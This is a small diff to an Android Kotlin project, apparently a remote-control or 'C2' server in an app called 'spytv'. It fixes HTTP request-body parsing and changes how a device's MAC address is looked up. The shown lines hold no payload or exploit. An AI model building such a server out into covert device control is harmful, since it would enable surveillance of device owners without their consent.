@@ -1,6 +1,7 @@
 package com.authenticated.spytv
 
 import android.util.Log
+import kotlin.concurrent.thread
 import java.io.*
 import java.net.InetSocketAddress
 import java.net.ServerSocket
@@ -125,7 +126,6 @@ class C2Server(private val port: Int = 8443) {
             
             // Read body if present
             val body = if (contentLength > 0) {
-                reader.readChar().toString() // skip the first reader char
                 val chars = CharArray(contentLength)
                 reader.read(chars, 0, contentLength)
                 String(chars)
@@ -545,10 +545,7 @@ class C2Server(private val port: Int = 8443) {
             val wifiManager = MainActivity.instance?.applicationContext
                 ?.getSystemService(android.content.Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
             val info = wifiManager?.connectionInfo
-            info?.macAddress ?: android.provider.Settings.Secure.getString(
-                MainActivity.instance?.contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            ) ?: "Unknown"
+            info?.macAddress ?: "Unknown"
         } catch (e: Exception) {
             "Unknown"
         }
